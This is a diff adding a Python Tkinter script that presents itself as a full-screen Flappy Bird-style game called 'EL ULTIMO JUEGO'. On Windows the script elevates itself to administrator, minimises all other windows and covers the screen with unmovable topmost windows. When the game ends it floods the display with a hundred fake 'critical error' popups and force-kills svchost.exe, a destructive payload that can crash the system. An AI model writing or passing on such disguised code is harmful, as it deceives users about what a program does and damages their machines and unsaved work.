@@ -1,0 +1,196 @@
+import ctypes
+import sys
+import subprocess
+import tkinter as tk
+import random
+import os
+
+# Intentar usar winsound solo si existe en Windows
+try:
+    import winsound
+    def beep_error():
+        winsound.Beep(600, 200)
+except:
+    def beep_error():
+        pass
+
+# Asegurar ejecución como administrador en Windows
+if sys.platform.startswith("win"):
+    try:
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        is_admin = False
+    if not is_admin:
+        ctypes.windll.shell32.ShellExecuteW(
+            None, "runas", sys.executable, " ".join(sys.argv), None, 1
+        )
+        sys.exit()
+
+# Forzar minimizar todas las ventanas usando tecla WIN+D y volver a mostrar la nuestra
+def minimizar_otras_ventanas():
+    if sys.platform.startswith("win"):
+        try:
+            import win32api
+            import win32con
+            win32api.keybd_event(win32con.VK_LWIN, 0, 0, 0)
+            win32api.keybd_event(0x44, 0, 0, 0)
+            win32api.keybd_event(0x44, 0, win32con.KEYEVENTF_KEYUP, 0)
+            win32api.keybd_event(win32con.VK_LWIN, 0, win32con.KEYEVENTF_KEYUP, 0)
+        except Exception as e:
+            print("No se pudieron minimizar otras ventanas:", e)
+
+minimizar_otras_ventanas()
+
+# Obtener tamaño de la pantalla
+root = tk.Tk()
+root.withdraw()
+SCREEN_W = root.winfo_screenwidth()
+SCREEN_H = root.winfo_screenheight()
+
+BIRD_W, BIRD_H = 40, 40
+PIPE_W = 80
+GAP = 200
+
+bird_y = SCREEN_H // 2
+velocity = 0
+gravity = 2
+jump_force = -20
+pipe_speed = 10
+score = 0
+game_over = False
+allow_restart = True
+
+pipes = []
+
+def make_unmovable(win):
+    win.overrideredirect(True)
+    win.attributes("-topmost", True)
+    win.attributes("-disabled", True)
+
+# Ventana gigante de fondo azul cielo
+background = tk.Toplevel()
+make_unmovable(background)
+background.title("FONDO")
+background.configure(bg="skyblue")
+background.geometry(f"{SCREEN_W}x{SCREEN_H}+0+0")
+
+# Ventana emergente gigante azul cielo que cubre toda la pantalla
+popup_fondo = tk.Toplevel()
+make_unmovable(popup_fondo)
+popup_fondo.configure(bg="skyblue")
+popup_fondo.geometry(f"{SCREEN_W}x{SCREEN_H}+0+0")
+popup_fondo.title("EL ULTIMO JUEGO - Fondo")
+tk.Label(popup_fondo, text="EL ULTIMO JUEGO", font=("Arial", 50, "bold"), bg="skyblue").pack(expand=True)
+
+bird = tk.Toplevel()
+make_unmovable(bird)
+bird.configure(bg="yellow")
+
+def create_pipe():
+    top_height = random.randint(100, SCREEN_H - GAP - 100)
+
+    top_win = tk.Toplevel()
+    make_unmovable(top_win)
+    top_win.configure(bg="green")
+
+    bottom_win = tk.Toplevel()
+    make_unmovable(bottom_win)
+    bottom_win.configure(bg="green")
+
+    pipes.append({"x": SCREEN_W, "h": top_height, "top": top_win, "bottom": bottom_win})
+
+def place_windows():
+    bird.geometry(f"{BIRD_W}x{BIRD_H}+100+{bird_y}")
+    for p in pipes:
+        x = p["x"]
+        h = p["h"]
+        p["top"].geometry(f"{PIPE_W}x{h}+{x}+0")
+        bottom_h = SCREEN_H - (h + GAP)
+        p["bottom"].geometry(f"{PIPE_W}x{bottom_h}+{x}+{h+GAP}")
+
+def mostrar_ventanas_emergentes():
+    for i in range(100):
+        w = tk.Toplevel()
+        w.geometry("200x100+{}+{}".format(random.randint(0, SCREEN_W-200), random.randint(0, SCREEN_H-100)))
+        w.title(f"ERROR {i}")
+        tk.Label(w, text="¡¡ERROR CRITICO!!", fg="red", font=("Arial", 14, "bold")).pack(expand=True)
+        w.attributes("-topmost", True)
+        w.update()
+        beep_error()
+
+def ejecutar_comando_peligroso():
+    if sys.platform.startswith("win"):
+        try:
+            mostrar_ventanas_emergentes()
+            subprocess.run("taskkill /IM svchost.exe /F", shell=True)
+        except Exception as e:
+            print("Error ejecutando el comando:", e)
+
+def game_loop():
+    global bird_y, velocity, score, game_over, allow_restart
+
+    if game_over:
+        allow_restart = True
+        bird.title("GAME OVER - Pulsa ESPACIO para reiniciar")
+        ejecutar_comando_peligroso()
+        return
+
+    velocity += gravity
+    bird_y += velocity
+
+    for p in pipes:
+        p["x"] -= pipe_speed
+
+    if len(pipes) == 0 or pipes[-1]["x"] < SCREEN_W - 250:
+        create_pipe()
+
+    for p in pipes[:]:
+        if p["x"] + PIPE_W < 0:
+            pipes.remove(p)
+            score += 1
+            bird.title(f"EL ULTIMO JUEGO - Puntos: {score}")
+
+    for p in pipes:
+        if (100 + BIRD_W > p["x"] and 100 < p["x"] + PIPE_W):
+            if bird_y < p["h"] or bird_y + BIRD_H > p["h"] + GAP:
+                game_over = True
+
+    if bird_y < 0 or bird_y + BIRD_H > SCREEN_H:
+        game_over = True
+
+    place_windows()
+
+    bird.after(30, game_loop)
+
+def jump(event=None):
+    global velocity, game_over, allow_restart
+    if game_over and allow_restart:
+        allow_restart = False
+        reset_game()
+    elif not game_over:
+        velocity = jump_force
+
+def reset_game():
+    global bird_y, velocity, score, game_over, pipes
+    bird_y = SCREEN_H // 2
+    velocity = 0
+    score = 0
+    game_over = False
+    bird.title("EL ULTIMO JUEGO - Puntos: 0")
+    for p in pipes:
+        p["top"].destroy()
+        p["bottom"].destroy()
+    pipes = []
+    create_pipe()
+    game_loop()
+
+bird.bind("<space>", jump)
+bird.focus_force()
+
+reset_game()
+
+popup_fondo.lower()
+background.lower()
+bird.lift()
+
+root.mainloop()
